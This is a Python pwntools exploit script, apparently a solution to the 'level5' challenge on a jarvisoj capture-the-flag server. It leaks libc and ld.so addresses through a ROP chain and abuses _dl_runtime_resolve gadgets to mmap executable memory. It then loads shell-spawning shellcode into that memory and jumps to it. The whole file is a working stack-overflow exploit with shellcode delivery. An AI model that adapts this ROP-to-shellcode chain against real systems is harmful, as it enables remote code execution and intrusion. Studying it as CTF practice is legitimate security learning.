#encoding:utf-8

"""
remote ld.so: _dl_runtime_resolve => 
   0:   48 83 ec 38             sub    rsp,0x38
   4:   48 89 04 24             mov    QWORD PTR [rsp],rax
   8:   48 89 4c 24 08          mov    QWORD PTR [rsp+0x8],rcx
   d:   48 89 54 24 10          mov    QWORD PTR [rsp+0x10],rdx
  12:   48 89 74 24 18          mov    QWORD PTR [rsp+0x18],rsi
  17:   48 89 7c 24 20          mov    QWORD PTR [rsp+0x20],rdi
  1c:   4c 89 44 24 28          mov    QWORD PTR [rsp+0x28],r8
  21:   4c 89 4c 24 30          mov    QWORD PTR [rsp+0x30],r9
  26:   48 8b 74 24 40          mov    rsi,QWORD PTR [rsp+0x40]
  2b:   48 8b 7c 24 38          mov    rdi,QWORD PTR [rsp+0x38]
  30:   e8 5b 8f ff ff          call   0xffffffffffff8f90
  35:   49 89 c3                mov    r11,rax
  38:   4c 8b 4c 24 30          mov    r9,QWORD PTR [rsp+0x30]
  3d:   4c 8b 44 24 28          mov    r8,QWORD PTR [rsp+0x28]
  42:   48 8b 7c 24 20          mov    rdi,QWORD PTR [rsp+0x20]
  47:   48 8b 74 24 18          mov    rsi,QWORD PTR [rsp+0x18]
  4c:   48 8b 54 24 10          mov    rdx,QWORD PTR [rsp+0x10]
  51:   48 8b 4c 24 08          mov    rcx,QWORD PTR [rsp+0x8]
  56:   48 8b 04 24             mov    rax,QWORD PTR [rsp]
  5a:   48 83 c4 48             add    rsp,0x48
  5e:   41 ff e3                jmp    r11
"""


from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

env = {'LD_PRELOAD':'./libc.so.6'}


class Pwn(object):

    def __init__(self, binary_file=None, remote=None, sign=True):
        self.remote_sign = sign
        if binary_file:
            self.binary_file = binary_file
            self.main = ELF(self.binary_file)
            self.libc = ELF('./libc.so.6')

            # some address
            self.write_plt = self.main.symbols['write']
            self.read_plt = self.main.symbols['read']
            self.write_got = self.main.got['write']
            self.read_got = self.main.got['read']
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']
        

    def get_overflow_position(self):
        io = self.main.process(env=env)
        io.recvline()
        io.send(cyclic(600))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.rip = cyclic_find(core.u32(core.rsp))
            print 'rip:', hex(self.rip)


    def get_io(self):
        io = None
        if self.remote_sign:
            io = remote(self.host, self.port)
        else:
            io = self.main.process(env={'LD_PRELOAD':self.libc.path})
        return io


    def _call_rop(self, func_got, arg1, arg2, arg3, ret_func):
        payload = 'a' * self.rip 
        payload += p64(self.pop_multi_addr) + p64(0) + p64(1) 
        payload += p64(func_got)
        payload += p64(arg3) + p64(arg2) + p64(arg1)
        payload += p64(self.ret_addr)
        payload += 'a' * 56
        payload += p64(ret_func)
        self.io.send(payload)


    def _handle_dl_resolve_(self):
        print 'getting dl_runtime_resolve address'
        self._call_rop(func_got=self.write_got, 
                       arg1=1,
                       arg2=self.dl_runtime_resolve_addr,
                       arg3=8,
                       ret_func=self.main.symbols['main'])
        self.dl_runtime_resolve_addr_true = self.io.unpack()
        print 'dl_runtime_resolve_addr:', hex(self.dl_runtime_resolve_addr_true)
        self.io.recvuntil("Input:\n")

        print 'get dl_runtime_resolve function...'
        self._call_rop(func_got=self.write_got, 
                       arg1=1,
                       arg2=self.dl_runtime_resolve_addr_true,
                       arg3=100,
                       ret_func=self.main.symbols['main'])
        dl_runtime_function = self.io.recvn(100)
        self.io.recvuntil("Input:\n")
        print disasm(dl_runtime_function)
        print '=' * 80

    
    def get_shell(self):
        self.rip = 0x88
        self.io = self.get_io()
        gdb.attach(self.io, """b *0x4005fd\n continue\n continue\n continue\n""")
        # gdb.attach(self.io, """b main""")
        # gdb.attach(self.io, """b *0x4005fd\n continue\n""")
        self.io.recvuntil("Input:\n")

       
        self.dl_runtime_resolve_addr = 0x600A50

        self.pop_multi_addr = 0x4006AA
        self.ret_addr = 0x400690

        print 'getting write_got address...'
        self._call_rop(func_got=self.write_got, 
                       arg1=1,
                       arg2=self.write_got,
                       arg3=8,
                       ret_func=self.main.symbols['main'])
        self.write_got_plt = self.io.unpack()
        self.io.recvuntil("Input:\n")
        print "write_got_plt:", hex(self.write_got_plt)
        
        # get libc address
        self.libc.address = self.write_got_plt - self.libc.symbols['write']
        print 'libc.addres:', hex(self.libc.address)

        # pop_rax_ret_addr = self.libc.address + 0x33544
        pop_rax_ret_addr = self.libc.address + 0x487a8
        print 'pop_rax_ret_addr:', hex(pop_rax_ret_addr)

        self._handle_dl_resolve_()

        # 本地高版本ld.so存在防护
        gadgets_addr = None
        # if self.remote_sign:
        gadgets_addr = self.dl_runtime_resolve_addr_true + 0x35
        # else:
            # gadgets_addr = self.dl_runtime_resolve_addr_true + 0x7a
        print 'godgets_addr:', hex(gadgets_addr)

        mmap_addr = self.libc.symbols['mmap64']

        shellcode_addr = 0xbeef0000 
        shellcode_addr = 0x1921000
        # shellcode_addr = self.main.bss()

        # void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
        # mmap[rdi=shellcode_addr, rsi=length(1024), rdx=prot(7), rcx=flags(34), r8=fd(0), r9=offset(0)]
        # stack order: 
        """
        +--------+
        |   r9   | rsp+0x30 => offset(0)
        +--------+
        |   r8   | rsp+0x28 => fd(0)
        +--------+
        |   rdi  | rsp+0x20 => shellcode_addr
        +--------+
        |   rsi  | rsp+0x18 => length(1024)
        +--------+
        |   rdx  | rsp+0x10 => prot(7)
        +--------+
        |   rcx  | rsp+8    => flags(34)
        +--------+
        """
        print 'execute mmap...'
        func_mmap_args = p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0)
        payload = 'a' * self.rip + p64(pop_rax_ret_addr) + p64(mmap_addr)
        payload += p64(gadgets_addr)
        payload += 'a' * 0x48
        payload += p64(self.main.symbols['main'])
        payload += func_mmap_args
        self.io.send(payload)

        # write shellcode to mmap memory
        print 'starting read shellcode.#############################'
        print 'shellcode_addr:', hex(shellcode_addr)
        self.io.recvuntil("Input:\n")
        shellcode = asm(shellcraft.amd64.sh())
        self._call_rop(func_got=self.read_got, 
                       arg1=0,
                       arg2=shellcode_addr,
                       arg3=len(shellcode),
                       # ret_func=shellcode_addr)
                       ret_func=self.main.symbols['main'])
        print 'sending shellcode...%%%%%%%%%%%%%%%%%%%%%%%%%%%'
        self.io.send(shellcode)
        self.io.recvuntil("Input:\n")
        print 'sending abcd...'
        # self.io.send('abcd')
        # self.io.recvuntil('Hello, World!\n')

        self.io.send(fit({self.rip:p64(shellcode_addr)}))
        # # pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A'
        # # payload  = pattern + p64(shellcode_addr)
        self.io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level5', sign=False)
    # pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=True)
    # pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

